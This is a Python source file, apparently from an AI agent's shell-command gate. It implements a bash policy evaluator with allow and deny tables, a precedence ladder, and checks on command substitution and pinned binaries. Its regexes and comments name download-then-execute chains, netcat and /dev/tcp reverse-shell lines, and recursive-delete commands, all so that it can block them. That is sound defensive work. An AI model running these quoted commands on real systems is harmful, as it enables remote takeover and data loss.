"""Declarative bash policy evaluator.

Single pure function that takes a command string + a policy dict and
returns an allow/block decision with the matched rule name. No I/O,
no project_root, no sqlite — composability matters because the same
evaluator is invoked from the runtime gate AND from a future dashboard
preview surface ("show me what this rule change would block").

Policy shape:
    {
        "default": "block" | "allow" | "ask",
        "allow": { "<base_cmd>": ["<pattern>", ...] },
        "deny":  { "<base_cmd>": ["<pattern>", ...] },
    }

Patterns are fnmatch-style. "*" matches all subcommand text. "status"
matches exactly "status" (no args). "push --force*" matches anything
starting with "push --force".

default="ask" (#472): an unlisted command returns allowed=False +
verdict="ask" (matched_rule "default.ask") — the hook layer maps it to
permissionDecision=ask, one-shot per invocation, never a sticky grant
(same contract as the #18 family-ask verdict). The SHIPPED factory
default (config._DEFAULT_CONFIG["bash"]["default"]) is "ask" for the
interactive native-hook surface; the operator key `bash.default` sets
it back to "block" (or to "allow"). Fail-closed contexts are UNTOUCHED
by this default: evaluate_destructive_floor (the internal ai_run /
code_runner floor) never reads the operator policy at all, and a locked
family (_JUDGE_DENYLIST) can never escalate to ask — it pins to the
canonical destructive refusal.

═══════════════════════════════════════════════════════════════════════
 SECURITY PRECEDENCE LADDER — read this before editing the evaluator
═══════════════════════════════════════════════════════════════════════

Layers are evaluated top-to-bottom. Each layer either BLOCKS (returns
a refusal), ALLOWS (returns success and stops), or PASSES THROUGH
(continues to the next layer). Higher = stronger — a BLOCK at a
higher layer cannot be overridden by anything below.

  Rank │ Layer                       │ Can be bypassed by
  ─────┼─────────────────────────────┼──────────────────────────────
   1   │ locked-family taxonomy     │ NOTHING. Shared floor. Defense-
       │ (rm/sudo/dd/mkfs/kill/etc.) │ in-depth even if the upstream
       │                             │ grant detector misfires.
   2   │ dangerous-chain patterns    │ NOTHING. `curl … | sh` and
       │ (curl|sh, base64|sh, etc.)  │ siblings stay blocked even
       │                             │ with `allow curl` + `allow sh`.
   3   │ user-intent grant           │ _JUDGE_DENYLIST (layer 1)
       │ ("allow psql" etc.)         │ and dangerous-chain (layer 2)
       │                             │ only. Trumps layers 4 and 5.
   4   │ operator deny-table         │ user-intent grant (layer 3).
       │ (policy.deny)               │ Intent: typing "allow X" means
       │                             │ "I know X is denied, run it".
   5   │ operator allow-table        │ n/a (it only allows, can't
       │ (policy.allow)              │ block).
   6   │ default policy              │ any allow above.
       │ (policy.default=block/allow)│

The heuristic_judge runs IN ADDITION to this evaluator at the
agent_orchestrator layer. This module's job is the statically-
provable safety net; the judge is the semantic reviewer. Neither
depends on the other.

Policy shape:
    {
        "default": "block" | "allow" | "ask",
        "allow": { "<base_cmd>": ["<pattern>", ...] },
        "deny":  { "<base_cmd>": ["<pattern>", ...] },
    }

Patterns are fnmatch-style. "*" matches all subcommand text. "status"
matches exactly "status" (no args). "push --force*" matches anything
starting with "push --force".

For chained / piped commands, the evaluator splits on `|`, `&&`, `||`,
`;` and requires every base command to pass. First-failing command's
reason is surfaced.
"""

from __future__ import annotations

import fnmatch
import re
from typing import Any

from .destructive_taxonomy import SHELL_LOCKED_COMMAND_FAMILIES


CANONICAL_SHELL_POLICY_NAMESPACE = "bash"


def load_canonical_bash_policy(*, project_root: Any) -> dict[str, Any] | None:
    """Load the one operator policy used by ai_run and native shell transports."""

    from .config import get_setting

    policy = get_setting(
        CANONICAL_SHELL_POLICY_NAMESPACE,
        project_root=project_root,
        default=None,
    )
    return policy if isinstance(policy, dict) else None



_CHAIN_SPLIT_RE = re.compile(r"\s*(?:\|\||&&|\||;)\s*")

# Dangerous chain patterns — match the FULL chained command, not per segment.
# Even if every segment passes per-segment deny/allow checks (e.g. `curl` and
# `sh` are both individually allowlisted), a download-then-execute chain is
# still dangerous because the composition is the supply-chain attack vector.
# Evaluated between the deny and allow passes so explicit operator denies
# still take precedence, but no allow rule can authorize one of these
# constructions.
_DANGEROUS_CHAIN_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
    (
        "curl_pipe_shell",
        re.compile(
            r"\b(?:curl|wget|fetch)\b[^|]*\|\s*(?:ba|z|k|c|d)?sh\b",
            re.IGNORECASE,
        ),
    ),
    (
        "curl_pipe_python",
        re.compile(
            r"\b(?:curl|wget|fetch)\b[^|]*\|\s*python[23]?\b",
            re.IGNORECASE,
        ),
    ),
    (
        "curl_subshell_exec",
        re.compile(
            r"(?:^|[\s;&|])(?:ba|z|k|c)?sh\s+-c\s+['\"]?\$\(\s*(?:curl|wget|fetch)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "curl_eval",
        re.compile(
            r"\beval\s+['\"]?\$\(\s*(?:curl|wget|fetch)\b",
            re.IGNORECASE,
        ),
    ),
    (
        "iwr_iex",
        re.compile(
            r"(?:invoke-webrequest|\biwr\b)[^|]*\|\s*(?:invoke-expression|\biex\b)",
            re.IGNORECASE,
        ),
    ),
    # NOTE (#319/#233, empire-doctrine Article XXII): command substitution
    # ($(...) / backtick) is NO LONGER a blanket regex here. A blanket `\$\(|`
    # `` match false-positived every benign local reader ($(git rev-parse HEAD),
    # $(date), $(basename x)) as "download-then-execute". It is now handled by
    # _evaluate_command_substitution (Phase 2a) — a recursive inner-command
    # check that allows proven-safe local readers and still blocks the real
    # vectors (cat $(rm x), $(curl ...), backtick rm). ONE narrowed rule, shared
    # by every caller of evaluate_bash_policy (ai_run + native core-law delegate).
    # Process substitution: `diff <(cmd) f` / `cmd >(sink)` likewise execute an
    # embedded command the per-segment view never inspects -> hard-deny.
    (
        "process_substitution",
        re.compile(r"<\(|>\("),
    ),
    # Netcat / ncat backdoor: `nc -e /bin/sh attacker 4444` or piped variants.
    # Even with allowlisted nc, the -e/-c reverse-shell flag is the smoking
    # gun. Also matches the "nc … | sh" pipe variant for command injection.
    (
        "netcat_reverse_shell",
        re.compile(
            r"\b(?:nc|ncat|netcat)\b[^|]*(?:\s-(?:e|c)\s+\S+|\|\s*(?:ba|z|k|c|d)?sh\b)",
            re.IGNORECASE,
        ),
    ),
    # /dev/tcp bash-builtin reverse shell: `bash -i >& /dev/tcp/host/port 0>&1`
    # — no external binary so it bypasses allowlists entirely.
    (
        "bash_dev_tcp",
        re.compile(
            r"/dev/tcp/[^\s/]+/\d+",
            re.IGNORECASE,
        ),
    ),
    # base64-decoded shell exec: `echo … | base64 -d | sh` is the obfuscated
    # cousin of curl|sh. Pattern: any "| base64 -d" feeding into a shell.
    (
        "base64_pipe_shell",
        re.compile(
            r"\bbase64\s+(?:-d|--decode)\b[^|]*\|\s*(?:ba|z|k|c|d)?sh\b",
            re.IGNORECASE,
        ),
    ),
    # Wget output-document direct-to-shell: `wget -O - URL | sh` (already
    # caught by curl_pipe_shell, but the explicit `-O -` variant is worth
    # naming so the audit log carries the exact attack vector).
    (
        "wget_output_pipe_shell",
        re.compile(
            r"\bwget\b[^|]*\s-O\s+-\s+[^|]*\|\s*(?:ba|z|k|c|d)?sh\b",
            re.IGNORECASE,
        ),
    ),
    # Cross-segment destructive: `cd <dir> && rm -rf …` — the gate's
    # per-segment view sees `cd` (allowlisted) and `rm -rf` (denied) but
    # could miss the chain's intent. Pin it explicitly so a `cd` prefix
    # can never sandwich a destructive op past the audit trail.
    (
        "cd_then_rm_rf",
        re.compile(
            r"\bcd\b[^;&|]*[;&|]+\s*(?:sudo\s+)?rm\s+(?:-[rRfd]+\s+){1,3}",
            re.IGNORECASE,
        ),
    ),
    # Powershell remove-item with -recurse -force on backslash paths
    # (Windows analog of rm -rf). Already in deny tables but the chained
    # `cd … ; remove-item -r -fo` form deserves its own audit tag.
    #
    # Doctrinal note (Batch B, 2026-04-29): this PowerShell-shape
    # rule lives in bash_policy declarative tables — strictly
    # speaking it's a misplacement under the AIDOCS shell provider
    # lock (Invariant #38), since bash_policy.py is the bash dialect
    # tier and PowerShell will get its own dispatcher in Batch C.
    # KEPT here intentionally because coverage is NOT duplicate with
    # heuristic_judge.BASH_PS_REMOVE:
    #   - BASH_PS_REMOVE catches long-form `-Recurse` (with or
    #     without `-Force`) and the order `-r ... remove-item`.
    #   - powershell_remove_recurse catches short forms `-r ... -f`
    #     and the `rd` / `rmdir` aliases, AND requires both
    #     `-r` and `-f` together.
    # Removing this rule would lose the short-form / alias coverage
    # at the bash_policy gate. Migration target: Batch C will add a
    # PowerShell dispatcher and this pattern moves to the new
    # PowerShell rule table at that time. Until then, keep as-is.
    (
        "powershell_remove_recurse",
        re.compile(
            # Match `Remove-Item -Recurse -Force …` AND short forms
            # `ri -r -fo …` / `ri -recurse -force …`. PowerShell tolerates
            # any unique prefix, so `-r` and `-fo` are both `-Recurse` and
            # `-Force` shortenings. Word-boundary on the rule keyword is
            # too strict; just pin -r… and -f… as the next args after the
            # cmdlet name with at most one other token between them.
            r"\b(?:remove-item|ri|rd|rmdir)\b(?:\s+-\w+)*\s+-r\w*(?:\s+-\w+)*\s+-f\w*",
            re.IGNORECASE,
        ),
    ),
]


def _split_chained(command: str) -> list[str]:
    """Split a shell command on chain operators, respecting shell quoting
    and balanced parens/brackets.

    Chain operators: `|`, `||`, `&&`, `;`.
    Quotes: single (`'...'`) and double (`"..."`). A backslash inside
        double quotes escapes the next character (including another `"`).
        Single quotes disable all escapes (matches POSIX shell).
    Brackets: `(...)`, `[...]`, `{...}`. Must balance; nesting tracked
        with a stack. Useful so `python -c "[x for x in y]"` and
        `bash -lc '(a && b)'` don't get shredded at the `;` or `&&`
        inside them — the per-segment evaluator would reject the
        fragments as unparseable otherwise.

    This is still not a full shell parser — process substitution `<(...)`,
    here-docs, and arithmetic `$((...))` are treated as opaque balanced
    regions, which is the right default for policy evaluation (policy
    cares about base commands, not arithmetic internals).
    """
    segments: list[str] = []
    buf: list[str] = []
    i = 0
    n = len(command)
    quote: str | None = None  # active quote char, or None
    bracket_stack: list[str] = []

    def flush() -> None:
        piece = "".join(buf).strip()
        if piece:
            segments.append(piece)
        buf.clear()

    while i < n:
        c = command[i]

        # Inside a quote: consume until matching close. Double quotes
        # honor backslash escapes; single quotes don't.
        if quote is not None:
            buf.append(c)
            if quote == '"' and c == "\\" and i + 1 < n:
                buf.append(command[i + 1])
                i += 2
                continue
            if c == quote:
                quote = None
            i += 1
            continue

        # Not in a quote.
        if c in ("'", '"'):
            quote = c
            buf.append(c)
            i += 1
            continue
        if c in "([{":
            bracket_stack.append(c)
            buf.append(c)
            i += 1
            continue
        if c in ")]}":
            # Pop matching opener if present; tolerate unbalanced input.
            if bracket_stack:
                opener = bracket_stack[-1]
                if (opener, c) in (("(", ")"), ("[", "]"), ("{", "}")):
                    bracket_stack.pop()
            buf.append(c)
            i += 1
            continue

        # Outside any quote / bracket region — look for chain operators.
        if not bracket_stack:
            if c == "&" and i + 1 < n and command[i + 1] == "&":
                flush()
                i += 2
                continue
            if c == "|" and i + 1 < n and command[i + 1] == "|":
                flush()
                i += 2
                continue
            if c == "|":
                flush()
                i += 1
                continue
            if c == ";":
                flush()
                i += 1
                continue

        buf.append(c)
        i += 1

    flush()
    return segments


_ENV_PREFIX_RE = re.compile(r"^\s*([A-Z_][A-Z0-9_]*=\S*\s+)+", re.IGNORECASE)


def _normalize_basename(token: str) -> str:
    # Strip surrounding quotes, pull out the trailing path component, drop
    # a Windows .exe suffix so quoted absolute invocations
    # (`"C:/Program Files/PostgreSQL/17/bin/pg_dump.exe"`) match an allow
    # table keyed on the bare binary name (`pg_dump`). Mirrors the behavior
    # of the retired access_gate._extract_bash_commands — keeping the
    # normalization at the single-source-of-truth boundary avoids operators
    # having to encode every shell path they might be handed.
    t = token.strip()
    if (t.startswith('"') and t.endswith('"')) or (t.startswith("'") and t.endswith("'")):
        t = t[1:-1]
    # Path separator split — last component wins. Handle both unix and
    # windows separators; POSIX mingw paths like /c/Program Files work.
    t = t.replace("\\", "/")
    if "/" in t:
        t = t.rsplit("/", 1)[-1]
    if t.lower().endswith(".exe"):
        t = t[:-4]
    return t.lower()


def _base_command(segment: str) -> tuple[str, str]:
    """Return (base_command, args_text) for a single shell segment.

    `python -m pytest tests/` → ("python", "-m pytest tests/")
    `git status` → ("git", "status")
    `git` → ("git", "")
    `"C:/PG/pg_dump.exe" -h host` → ("pg_dump", "-h host")
    `PGPASSWORD=x pg_dump -v` → ("pg_dump", "-v")
    """
    stripped = segment.strip()
    # Strip leading env-var assignments (e.g. `PGPASSWORD=x CMD`).
    env_match = _ENV_PREFIX_RE.match(stripped)
    if env_match:
        stripped = stripped[env_match.end() :]
    # Honor a leading quoted path — take everything between matching quotes
    # as the command token, so `"C:/Program Files/pg_dump.exe" --help`
    # doesn't split at the interior space.
    if stripped.startswith('"'):
        close = stripped.find('"', 1)
        if close > 0:
            head = stripped[: close + 1]
            tail = stripped[close + 1 :].lstrip()
            return _normalize_basename(head), tail
    parts = stripped.split(maxsplit=1)
    if not parts:
        return "", ""
    base = _normalize_basename(parts[0])
    args = parts[1] if len(parts) > 1 else ""
    return base, args


def _pattern_matches(pattern: str, args: str) -> bool:
    """Match a policy pattern against a command's args text.

    "" pattern → only matches when args is empty (operator authorized
        the bare command, no args)
    "*" → matches anything (empty args included)
    "status" → exact match (no args)
    "status *" → status with any args
    "push --force*" → starts with "push --force"
    """
    pattern_clean = pattern.strip()
    if not pattern_clean:
        return not args
    if pattern_clean == "*":
        return True
    return fnmatch.fnmatchcase(args, pattern_clean)


# Denied filesystem-deletion commands -> point the agent at the governed tool.
# rm et al. stay DENIED; this only makes the refusal ACTIONABLE. ai_delete is the
# sanctioned single-file delete: it moves the file to .TRASH with a receipt
# (recoverable), and hard-deletes regenerable build/cache dirs.
_DELETE_COMMAND_HINTS: dict[str, str] = {
    "rm": " Use `ai_delete(path=...)` -- the governed single-file delete (to .TRASH, recoverable, with a receipt); regenerable build/cache dirs hard-delete. Raw rm stays denied.",
    "rmdir": " Use `ai_delete(path=...)`; regenerable dirs are hard-deleted by it. Raw rmdir stays denied.",
    "unlink": " Use `ai_delete(path=...)` -- governed, trash-with-receipt. Raw unlink stays denied.",
    "del": " Use `ai_delete(path=...)` -- governed, trash-with-receipt. Raw del stays denied.",
}


def _evaluate_segment_deny(segment: str, policy: dict[str, Any]) -> dict[str, Any] | None:
    """Deny-table check for one un-chained segment.

    Returns a block decision when a deny rule fires, or None when the
    segment passes the deny pass. An empty/unparseable segment is itself
    a block decision (we never silently allow something we couldn't
    tokenize).
    """
    base, args = _base_command(segment)
    if not base:
        return {
            "allowed": False,
            "reason": "Empty bash command segment.",
            "matched_rule": None,
        }

    deny_table = policy.get("deny") or {}
    for pattern in deny_table.get(base, []) or []:
        if _pattern_matches(pattern, args):
            reason = f"Command `{base} {args}` blocked by deny rule `{base}[{pattern}]`."
            reason += _DELETE_COMMAND_HINTS.get(base, "")
            return {
                "allowed": False,
                "reason": reason,
                "matched_rule": f"deny.{base}[{pattern}]",
            }
    return None


# ── #100 FIX2: resolved-binary verification (PATH-spoofing defense) ──────────
#
# An allow entry MAY be a legacy list of patterns (`["status", "push *"]`) OR a
# dict that ALSO pins the trusted binary:
#
#     {"patterns": ["status"], "path": "/usr/bin/git", "sha256": "<hex>"}
#
# When a path (and/or sha256) is pinned, the RESOLVED binary (what PATH would
# actually execute) must equal the pin before the command is allowed — otherwise
# an attacker who controls PATH could run a hostile `git` under the allowlisted
# name. Legacy list-shape entries pin nothing and are byte-identical to before.
# `_which` / `_samepath` / `_sha256_file` are module-level indirections so the
# policy stays a pure evaluator that tests can drive hermetically.


def _which(name: str) -> str | None:
    import shutil

    return shutil.which(name)


def _samepath(a: str, b: str) -> bool:
    import os

    try:
        return os.path.normcase(os.path.realpath(a)) == os.path.normcase(os.path.realpath(b))
    except OSError:
        return False


def _sha256_file(path: str) -> str | None:
    import hashlib

    try:
        h = hashlib.sha256()
        with open(path, "rb") as fh:
            for chunk in iter(lambda: fh.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()
    except OSError:
        return None


def _normalize_allow_entry(entry: Any) -> tuple[list[str], str | None, str | None]:
    """Split a legacy list OR dict-shape allow entry into
    (patterns, pinned_path, pinned_sha256). Unknown shapes yield no patterns
    (fail closed — the segment falls through to the default policy)."""
    if isinstance(entry, dict):
        patterns = [str(p) for p in (entry.get("patterns") or [])]
        path = entry.get("path")
        sha = entry.get("sha256")
        return (patterns, str(path) if path else None, str(sha) if sha else None)
    if isinstance(entry, (list, tuple)):
        return ([str(p) for p in entry], None, None)
    return ([], None, None)


def _verify_resolved_binary(
    base: str, pinned_path: str | None, pinned_sha: str | None
) -> dict[str, Any] | None:
    """Return a BLOCK decision when the resolved binary fails to match the pin,
    or None when it matches (or nothing is pinned). matched_rule
    `allow.<base>.path_mismatch` lets the caller emit a distinct
    `bash_policy_path_mismatch` audit event."""
    if not pinned_path and not pinned_sha:
        return None  # legacy / unpinned → no resolution, no behavior change

    def _block(reason: str) -> dict[str, Any]:
        return {
            "allowed": False,
            "reason": reason,
            "matched_rule": f"allow.{base}.path_mismatch",
        }

    resolved = _which(base)
    if resolved is None:
        return _block(
            f"Command `{base}` is allowlisted with a pinned trusted binary "
            f"(`{pinned_path or 'sha256'}`), but `{base}` is not found on PATH — "
            "cannot verify the binary that would execute. Refusing (fail closed)."
        )
    if pinned_path and not _samepath(resolved, pinned_path):
        return _block(
            f"Command `{base}` resolves to `{resolved}` but the policy pins "
            f"`{pinned_path}` — possible PATH spoofing. Refused."
        )
    if pinned_sha:
        actual = _sha256_file(resolved)
        if actual is None:
            return _block(
                f"Command `{base}` at `{resolved}` could not be hashed for the "
                "pinned-sha256 integrity check. Refusing (fail closed)."
            )
        if actual.lower() != pinned_sha.strip().lower():
            return _block(
                f"Command `{base}` at `{resolved}` has sha256 {actual[:12]}… which "
                f"≠ the pinned {pinned_sha.strip()[:12]}… — the binary was substituted "
                "or tampered. Refused."
            )
    return None


# ── #472: ask-ineligible families ────────────────────────────────────
#
# default="ask" escalates UNLISTED commands to a one-shot operator
# confirmation. File-mutation primitives must NOT ride that escalation:
# they are the Windows/PowerShell analogs of the rm/del family (which the
# _JUDGE_DENYLIST / deny-table already hard-refuse), and an ask here would
# put "delete infrastructure file" one operator click away. These stay on
# the hard default-block backstop; an operator who wants them types an
# explicit allow rule. This set can only ADD refusals relative to
# default=block — it can never authorize anything.
_ASK_INELIGIBLE_FAMILIES: frozenset[str] = frozenset(
    {
        # deletion (POSIX names already locked/denied elsewhere; belt)
        "rm", "rmdir", "del", "erase", "unlink", "rd",
        # PowerShell file-mutation cmdlets + canonical aliases
        "remove-item", "ri",
        "move-item", "mi",
        "copy-item", "cpi",
        "rename-item", "rni",
        "new-item", "ni",
        "out-file",
        "set-content", "sc",
        "add-content", "ac",
        "clear-content", "clc",
        # disk/link-level mutations
        "format", "mklink",
    },
)


def _evaluate_segment_allow(segment: str, policy: dict[str, Any]) -> dict[str, Any]:
    """Allow-table + default check for one un-chained segment.

    Caller must have already passed the segment through the deny pass
    and the dangerous-chain pass.
    """
    base, args = _base_command(segment)
    if not base:
        return {
            "allowed": False,
            "reason": "Empty bash command segment.",
            "matched_rule": None,
        }

    allow_table = policy.get("allow") or {}
    default = str(policy.get("default") or "block").lower()

    patterns, pinned_path, pinned_sha = _normalize_allow_entry(allow_table.get(base))
    for pattern in patterns:
        if _pattern_matches(pattern, args):
            # #100 FIX2: when the entry pins a trusted binary, verify the
            # RESOLVED binary before allowing — a pattern match on the NAME is
            # not authority to run a spoofed binary of the same name.
            mismatch = _verify_resolved_binary(base, pinned_path, pinned_sha)
            if mismatch is not None:
                return mismatch
            return {
                "allowed": True,
                "reason": f"Allowed by allow.{base}[{pattern}].",
                "matched_rule": f"allow.{base}[{pattern}]",
            }

    if default == "allow":
        return {
            "allowed": True,
            "reason": "Allowed by default policy (default=allow).",
            "matched_rule": "default.allow",
        }

    if default == "ask":
        # #472 usability: an unlisted command escalates to the operator
        # instead of hard-blocking. Same one-shot ask contract as the
        # family verdict (#18): allowed=False + verdict="ask", mapped by
        # the hook layer to permissionDecision=ask; NEVER sticky. The
        # caller (_evaluate_bash_policy_decision) pins locked families to
        # a hard refusal so this can never escalate rm/sudo/dd to ask.
        # Expansion / indirection in the COMMAND position (`$SHELL -c …`,
        # `$0 …`, backtick) is unprovable — we cannot know what binary will
        # run, so it must NEVER be one operator click from execution. Pin it
        # to the hard backstop. (`$`/backtick were already refused inside the
        # dev-toolchain family; this covers the default=ask escalation path.)
        raw_first = segment.strip().split(maxsplit=1)[0] if segment.strip() else ""
        if base in _ASK_INELIGIBLE_FAMILIES or "$" in raw_first or "`" in raw_first:
            return {
                "allowed": False,
                "reason": (
                    f"Command `{base or raw_first}` blocked by default policy "
                    "(file-mutation primitives and command-position expansions "
                    "are not ask-eligible; no allow rule matched)."
                ),
                "matched_rule": "default.block",
            }
        return {
            "allowed": False,
            "verdict": "ask",
            "reason": (
                f"Command `{base}` requires operator confirmation "
                "(no allow rule matched; default=ask)."
            ),
            "matched_rule": "default.ask",
        }

    return {
        "allowed": False,
        "reason": (
            f"Command `{base}` blocked by default policy (default=block, no allow rule matched)."
        ),
        "matched_rule": "default.block",
    }


# Redirection to a ROOTED path (absolute / drive / ~ / device / system). A
# `>`/`>>` not part of an fd redirection (`2>&1`, `>&2`) whose target begins
# rooted. The negative lookbehind `(?<![0-9&<>])` skips fd-dup forms; the
# target class after optional whitespace must start with `/`, `~`, or a
# Windows drive `X:\`/`X:/`.
_ROOTED_REDIRECT_RE: re.Pattern[str] = re.compile(
    r"(?<![0-9&<>])>>?\s*(?:/|~|[A-Za-z]:[\\/])",
)


def _evaluate_redirect_target(surface: str) -> dict[str, Any] | None:
    """Refuse a `>`/`>>` redirect whose target is a rooted (out-of-workspace)
    path. Returns a block decision or None. See the Phase 2c2 comment."""
    if _ROOTED_REDIRECT_RE.search(surface):
        return {
            "allowed": False,
            "reason": (
                "Command blocked by redirection-target floor — a `>`/`>>` "
                "redirect writes to a rooted path outside the workspace "
                "(absolute / device / system path). Redirect only to "
                "workspace-relative files."
            ),
            "matched_rule": "redirect_target.rooted",
        }
    return None


def _evaluate_dangerous_chain(command: str) -> dict[str, Any] | None:
    """Detect download-then-execute chains in the FULL command.

    Per-segment evaluation can't see chain semantics: each side of a
    `curl … | sh` pipe may be individually allowlisted, but the
    composition is the supply-chain attack vector. Returns a block
    decision when a dangerous pattern matches, None when the command
    is clean.

    Matches against the EXECUTABLE SURFACE — data-only windows (git -m/-F
    message payloads, heredoc bodies) are masked first — so a commit message
    that merely QUOTES `curl|sh` / `$(rm x)` / `rm -rf /` is not mistaken for
    executing it. Real execution outside the data window (a trailing
    `&& rm -rf /`, or a separate `| sh` segment) stays visible and matches.
    """
    from .shell_data_windows import mask_data_windows

    surface = mask_data_windows(command)
    for name, pattern in _DANGEROUS_CHAIN_PATTERNS:
        if pattern.search(surface):
            return {
                "allowed": False,
                "reason": (
                    f"Command blocked by dangerous-chain rule `{name}` "
                    "— download-then-execute pattern."
                ),
                "matched_rule": f"dangerous_chain.{name}",
            }
    return None


# ── #319/#233: narrowed command-substitution check (empire-doctrine XXII) ────
#
# Commands proven safe to run INSIDE a command substitution $(...) / `...`:
# pure / read-only / non-network / non-interpreter locals whose OUTPUT is
# commonly captured. Anything NOT here (curl/wget/nc, sh/bash/python/eval,
# rm/mv/dd, ...) keeps the substitution BLOCKED. `git` is included, but its
# destructive subcommands are still caught by the recursive policy eval below
# (deny-table + _JUDGE_DENYLIST), so `$(git push --force)` stays refused when
# the policy denies it.
_SUBST_SAFE_INNER: frozenset[str] = frozenset(
    {
        "git", "echo", "printf", "date", "basename", "dirname", "realpath",
        "readlink", "pwd", "whoami", "id", "hostname", "uname", "cat", "head",
        "tail", "wc", "ls", "cut", "tr", "sort", "uniq", "grep", "egrep",
        "fgrep", "rg", "expr", "seq", "which", "type", "stat",
        "test", "true", "false", "cksum", "md5sum", "sha1sum", "sha256sum",
    }
)


def _extract_command_substitutions(surface: str) -> list[str]:
    """Inner command string of every $(...) and backtick command substitution.

    Arithmetic $((...)) is skipped (no command runs). Process substitution
    <(...) / >(...) is NOT returned — it stays under the blanket
    process_substitution dangerous-chain rule. Balanced-paren aware, so a nested
    $( ... $(...) ... ) is captured at the OUTER level and the recursion in
    _evaluate_command_substitution re-scans the inner.
    """
    inners: list[str] = []
    n = len(surface)
    i = 0
    while i < n:
        ch = surface[i]
        if ch == "$" and i + 1 < n and surface[i + 1] == "(":
            # Arithmetic $((...)) is not a command substitution.
            if i + 2 < n and surface[i + 2] == "(":
                i += 3
                continue
            depth = 0
            j = i + 1
            start = i + 2
            while j < n:
                if surface[j] == "(":
                    depth += 1
                elif surface[j] == ")":
                    depth -= 1
                    if depth == 0:
                        break
                j += 1
            if j < n and depth == 0:
                inners.append(surface[start:j])
                i = j + 1
                continue
            i += 1
            continue
        if ch == "`":
            j = i + 1
            while j < n and surface[j] != "`":
                j += 1
            inners.append(surface[i + 1 : j])
            i = j + 1 if j < n else n
            continue
        i += 1
    return inners


def _evaluate_command_substitution(
    command: str, policy: dict[str, Any]
) -> dict[str, Any] | None:
    """Narrowed replacement for the old blanket $()/backtick block.

    A command substitution is REFUSED unless every inner command is a
    proven-safe local reader (base in _SUBST_SAFE_INNER) AND the inner
    independently passes the FULL policy (deny-table + dangerous-chain +
    _JUDGE_DENYLIST, via recursion). Keeps `cat $(rm x)`, `$(curl ...)`,
    backtick `rm` blocked; allows `$(git rev-parse HEAD)`, `$(date)`,
    `$(basename x)`. matched_rule stays `dangerous_chain.command_substitution`
    so existing block-side regression tests hold. Shared by every caller of
    evaluate_bash_policy (ai_run + the native core-law delegate) — one rule.
    """
    from .shell_data_windows import mask_shell_literal_windows

    def _block(reason: str) -> dict[str, Any]:
        return {
            "allowed": False,
            "reason": (
                "Command blocked by dangerous-chain rule "
                f"`command_substitution` — {reason}"
            ),
            "matched_rule": "dangerous_chain.command_substitution",
        }

    surface = mask_shell_literal_windows(command)
    for inner in _extract_command_substitutions(surface):
        inner_cmd = inner.strip()
        if not inner_cmd:
            continue

        # Every segment's base command must be a proven-safe local reader.
        for seg in _split_chained(inner_cmd):
            base, _args = _base_command(seg)
            if base not in _SUBST_SAFE_INNER:
                return _block(
                    f"the substitution `$({inner_cmd})` runs `{base or '?'}`, which "
                    "is not a proven-safe local reader (only pure read-only locals "
                    "like git/date/basename may run inside a substitution; use "
                    "ai_run for anything else)."
                )

        # Bases are safe, but their ARGS / chain must still pass the full policy
        # (`git push --force` inside $() stays denied where the policy denies it;
        # a nested $(rm x) is caught by this same check recursively).
        # default='allow': safe-inner membership IS the authorization — the
        # inner need NOT be in the OUTER allow-table (date/basename may appear in
        # $() even when the caller's policy doesn't list them). deny-table +
        # dangerous-chain + nested-substitution still fire and block.
        inner_decision = evaluate_bash_policy(
            inner_cmd, {**policy, "default": "allow"}
        )
        if not inner_decision.get("allowed"):
            return _block(
                f"the substitution `$({inner_cmd})` is itself refused: "
                f"{inner_decision.get('reason')}"
            )
    return None


# Locked command families never receive user-intent grants. This compatibility
# alias points at the shared taxonomy object; it is not a second definition.
_JUDGE_DENYLIST = SHELL_LOCKED_COMMAND_FAMILIES


def _destructive_primitive_refusal(base: str) -> dict[str, Any]:
    """One canonical refusal shape for an unbypassable shell primitive."""
    reason = (
        f"Command blocked by destructive-primitive floor `{base}` -- "
        "unbypassable on every shell egress path."
    )
    reason += _DELETE_COMMAND_HINTS.get(base, "")
    return {
        "allowed": False,
        "reason": reason,
        "matched_rule": f"destructive_floor.{base}",
    }


def _normalize_grants(
    user_intent_subcommands: list[str] | None,
) -> frozenset[str]:
    """Defensive normalization: lowercased, stripped, judge-denylist
    removed. Returns frozenset for O(1) membership checks in hot path.
    """
    if not user_intent_subcommands:
        return frozenset()
    out: set[str] = set()
    for token in user_intent_subcommands:
        if not token:
            continue
        t = str(token).strip().lower()
        if not t or t in _JUDGE_DENYLIST:
            continue
        out.add(t)
    return frozenset(out)


# OS-mismatch table. Maps base command → suggested replacement on
# the current platform. Conservative: only commands that are GENUINELY
# unavailable on the wrong OS are listed. Tools commonly bundled with
# Git Bash / WSL / Cygwin (`grep`, `tail`, `head`, `sort`, `wc`,
# `cut`, `uniq`, `sed`, `awk`, `diff`, `which`) are NOT gated — most
# Windows dev machines have them via Git for Windows. Listing them
# here false-refuses real-world commands.
# Truly POSIX-only kept here:
# ── Family verdict map (backlog #18) ─────────────────────────────────
#
# Additive policy shape: `policy["commands"]` is a flat
# {<base_cmd_family>: "allow" | "deny" | "ask"} map — one verdict per
# command family. It ranks ABOVE the legacy allow/deny pattern tables
# and BELOW the unbypassable layers (_JUDGE_DENYLIST, dangerous
# chains, command substitution, heredoc consumer law).
#
# "ask" surfaces as allowed=False + verdict="ask" in the result dict;
# the hook layer maps that to permissionDecision=ask (one-shot per
# invocation, never sticky).

_FAMILY_VERDICTS = frozenset({"allow", "deny", "ask"})


def _configured_family_verdict(policy: dict[str, Any], base: str) -> str | None:
    """Read and validate one configured family verdict without applying locks."""
    if not base or not isinstance(policy, dict):
        return None
    commands = policy.get("commands")
    if not isinstance(commands, dict):
        return None
    verdict = commands.get(base)
    if not isinstance(verdict, str):
        return None
    normalized = verdict.strip().lower()
    return normalized if normalized in _FAMILY_VERDICTS else None


def resolve_family_verdict(policy: dict[str, Any], base: str) -> str | None:
    """Return the effective family verdict after unbypassable locks.

    A configured deny remains visible for judge-locked families. Configured
    allow/ask verdicts are suppressed here; the Phase 3 floor reports the
    canonical destructive refusal instead of authorizing or escalating them.
    """
    verdict = _configured_family_verdict(policy, base)
    if verdict is None:
        return None
    locked = base in _JUDGE_DENYLIST or base.split(".", 1)[0] in _JUDGE_DENYLIST
    if locked and verdict in {"allow", "ask"}:
        return None
    return verdict


def normalize_policy_commands(policy: dict[str, Any]) -> dict[str, str]:
    """Fold a policy dict into the canonical #18 family→verdict map.

    Legacy tables fold in first (any allow entry → "allow", any deny
